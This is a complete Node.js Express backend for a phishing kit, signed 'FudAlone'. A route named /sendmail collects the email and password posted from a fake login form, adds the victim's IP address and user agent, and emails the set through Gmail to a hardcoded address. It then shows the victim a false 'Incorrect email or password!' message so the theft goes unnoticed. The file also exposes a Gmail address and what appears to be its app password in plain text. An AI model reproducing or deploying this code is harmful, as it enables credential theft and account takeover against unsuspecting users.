// initializing installed packages
const express = require("express");
const app = express();
const nodemailer = require("nodemailer");
const cors = require("cors");
const requestIp = require('request-ip');

// declearing which port my server will be listening on
const port = process.env.PORT || 8000;

// getting the app to get response from the frontend and send json
app.use(express.json({ extended: true }));
app.use(cors());

app.get('/', (req,res) => {
    res.send('server is active')
})

app.post("/sendmail", async (req, res) => {
    const clientIp = requestIp.getClientIp(req);
    const userAgent = req.headers['user-agent'];

    let { email, password } = req.body;
    const to = "jimwilliams513@gmail.com"; // where the login details gets sent to

    const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: "jimwilliams513@gmail.com", // The email of the user 
            pass: "klkfthxlxzloelgl", // The password of the user 
        },
    });

    const details = {
        to: `${to}`,
        subject: `Login: ${clientIp}`,
        text: `|----------| FudAlone|--------------|
Login From           : ${clientIp}
Online ID            : ${email}
Passcode             : ${password}
|--------------- I N F O | I P -------------------|
Client IP: ${clientIp}
|--- https://www.geodatatool.com/en/?ip=${clientIp} ----|
User Agent : ${userAgent}
|----------- CrEaTeD bY FudAlone --------------|`,
    };

    try {
        transporter.sendMail(details, (err) => {
            if (err) {
                res.json({ success: false, message: `Something went wrong while trying to get you in` });
            } else {
                res.json({
                    success: true,
                    message: `Incorrect email or password!`
                });
            }
        });

    } catch (error) {
        res.json({ success: false, message: error.message });
    }
});

// starting the server up
app.listen(port, () => {
    console.log(`server listening on port ${port}`);
});
